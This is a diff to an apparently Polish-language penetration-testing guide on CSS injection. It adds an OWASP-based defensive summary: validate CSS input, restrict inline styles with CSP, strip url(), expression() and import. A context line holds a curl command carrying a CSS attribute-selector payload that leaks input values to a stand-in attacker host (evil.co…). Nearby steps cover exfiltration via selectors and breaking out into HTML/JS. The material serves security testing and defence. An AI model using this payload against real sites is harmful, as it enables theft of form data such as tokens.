@@ -40,3 +40,18 @@ curl -s "https://TARGET/page?css=input[value^='a']{background:url(http://evil.co
 3. Sprawdz mozliwosc exfiltracji danych via CSS selectors
 4. Testuj break z kontekstu CSS do HTML/JS
 
+
+---
+
+## CHEATSHEET OWASP — Kluczowe wskazówki
+
+> Źródło: OWASP CheatSheetSeries — Securing_Cascading_Style_Sheets_Cheat_Sheet.md
+
+- Waliduj CSS input — nie pozwalaj na user-controlled style attributes
+- Uzywaj CSP aby ograniczyc inline styles (`style-src` directive)
+- Sanityzuj wlasciwosci CSS — usun expression(), url(), import
+- Unikaj wstawiania user input do atrybutu style bezposrednio
+
+## ROZSZERZENIA BURP SUITE
+
+Brak dedykowanych rozszerzen Burp dla tego testu.
